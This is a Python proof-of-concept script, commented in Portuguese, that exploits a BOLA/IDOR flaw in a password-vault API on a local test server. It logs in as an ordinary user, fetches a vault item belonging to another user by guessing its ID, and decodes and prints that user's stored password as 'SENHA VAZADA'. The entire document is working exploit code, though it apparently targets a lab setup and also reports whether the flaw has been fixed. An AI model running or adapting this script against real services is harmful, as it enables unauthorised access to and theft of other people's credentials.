import requests
import base64
import json

# Configurações do Alvo
URL_BASE = "http://localhost:5001"
# Credenciais de um usuário comum (Nível baixo)
ATACANTE = {
    "username": "andreia.security",
    "password": "senha01"
}

# O ID que queremos acessar indevidamente (Sabemos que IDs altos pertencem a outros users)
ID_ALVO = 10 

def executar_poc():
    print(f"\n[+] Iniciando PoC de BOLA/IDOR contra {URL_BASE}")
    
    # 1. Obter Sessão Válida
    print(f"[*] Autenticando com usuário: {ATACANTE['username']}...")
    sessao = requests.Session()
    resp_login = sessao.post(f"{URL_BASE}/api/auth/login", json=ATACANTE)
    
    if resp_login.status_code != 200:
        print("[-] Erro no login. Verifique as credenciais ou se o servidor está rodando.")
        return

    dados_login = resp_login.json()
    token = dados_login.get('token')
    user_id_atacante = dados_login.get('user_id')
    
    # Cabeçalho com o Token JWT legítimo
    headers = {'Authorization': f'Bearer {token}'}
    print(f"[+] Autenticado! User ID: {user_id_atacante} | Token capturado.")

    # 2. Executar o Ataque (Acessar objeto de outro usuário)
    print(f"[*] Tentando acessar o Item do Cofre ID: {ID_ALVO} (que não pertence a Andreia)...")
    url_vulneravel = f"{URL_BASE}/api/vault/items/{ID_ALVO}"
    
    resp_ataque = sessao.get(url_vulneravel, headers=headers)

    # 3. Analisar Resultado
    if resp_ataque.status_code == 200:
        dados = resp_ataque.json()
        print("\n" + "!"*50)
        print("VULNERABILIDADE CONFIRMADA (BOLA/IDOR)")
        print("!"*50)
        print(f"[-] Item Acessado ID: {dados['id']}")
        print(f"[-] Dono Real do Item (User ID): {dados['user_id']}")
        print(f"[-] Quem solicitou (User ID): {dados['current_user_id']}")
        print("-" * 30)
        print(f"[+] Serviço: {dados['service_name']}")
        print(f"[+] Username: {dados['username']}")
        
        try:
            senha_plana = base64.b64decode(dados['password']).decode('utf-8')
            print(f"[+] SENHA VAZADA: {senha_plana}")
        except:
            print(f"[+] Senha (Encoded): {dados['password']}")
            
        print("="*50 + "\n")
    elif resp_ataque.status_code == 404:
        print("[-] Item não encontrado. Tente outro ID.")
    elif resp_ataque.status_code == 403:
        print("[*] Falha no ataque. O servidor retornou 403 Forbidden (Provavelmente está corrigido!).")
    else:
        print(f"[-] Status inesperado: {resp_ataque.status_code}")

if __name__ == "__main__":
    executar_poc()
